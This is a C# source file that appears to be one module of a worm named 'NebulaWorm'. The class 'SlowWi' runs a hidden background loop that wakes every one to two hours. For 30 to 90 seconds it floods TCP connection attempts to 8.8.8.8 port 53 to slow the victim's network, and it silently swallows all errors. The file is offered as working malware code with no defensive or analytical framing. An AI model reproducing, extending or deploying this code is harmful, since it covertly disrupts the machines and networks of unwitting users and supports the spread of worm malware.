﻿using System;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace NebulaWorm // this module is for fun u can delete this if u want to
{
    internal static class SlowWi
    {
        private static readonly Random rnd = new Random();
        private static bool isRunning = false;
        private static CancellationTokenSource cts;

        public static void Start()
        {
            if (isRunning) return;
            isRunning = true;
            cts = new CancellationTokenSource();

            Task.Run(async () =>
            {
                while (!cts.IsCancellationRequested)
                {
                    try
                    {
                       
                        int waitTime = rnd.Next(3600_000, 7_200_000);
                        await Task.Delay(waitTime, cts.Token);

                       
                        int slowDurationMs = rnd.Next(30_000, 90_000);
                        DateTime slowEnd = DateTime.UtcNow.AddMilliseconds(slowDurationMs);

                       
                        while (DateTime.UtcNow < slowEnd && !cts.IsCancellationRequested)
                        {
                            
                            var tasks = new Task[5];
                            for (int i = 0; i < tasks.Length; i++)
                                tasks[i] = OpenFakeConnectionAsync();

                            await Task.WhenAll(tasks);

                        
                            int delay = rnd.Next(30, 70);
                            await Task.Delay(delay, cts.Token);
                        }

                    }
                    catch (TaskCanceledException)
                    {
             
                        break;
                    }
                    catch (Exception ex)
                    {
                 
                    }
                }
            }, cts.Token);
        }

        public static void Stop()
        {
            if (!isRunning) return;
            cts.Cancel();
            isRunning = false;
        }

        private static async Task OpenFakeConnectionAsync()
        {
            try
            {
                using (TcpClient client = new TcpClient())
                {
                    var connectTask = client.ConnectAsync("8.8.8.8", 53);
                    var timeoutTask = Task.Delay(1000);

                    var completedTask = await Task.WhenAny(connectTask, timeoutTask);
                    if (completedTask == connectTask && client.Connected)
                    {
                     
                        client.Close();
                    }
                    else
                    {
                
                        client.Dispose();
                    }
                }
            }
            catch
            {
               
            }
        }

        private static void ConsoleWrite(string message)
        {
            try
            {
                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                Console.WriteLine(message);
                Console.ResetColor();
            }
            catch { }
        }
    }
}
